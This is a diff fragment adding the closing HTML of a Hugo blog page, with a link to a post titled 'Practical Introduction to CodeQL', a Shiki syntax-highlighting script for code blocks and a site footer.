+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.github.io/blog/post/practical-codeql-introduction/">
+                  <span class="button__text">Practical Introduction to CodeQL</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.github.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.github.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2022 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.github.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
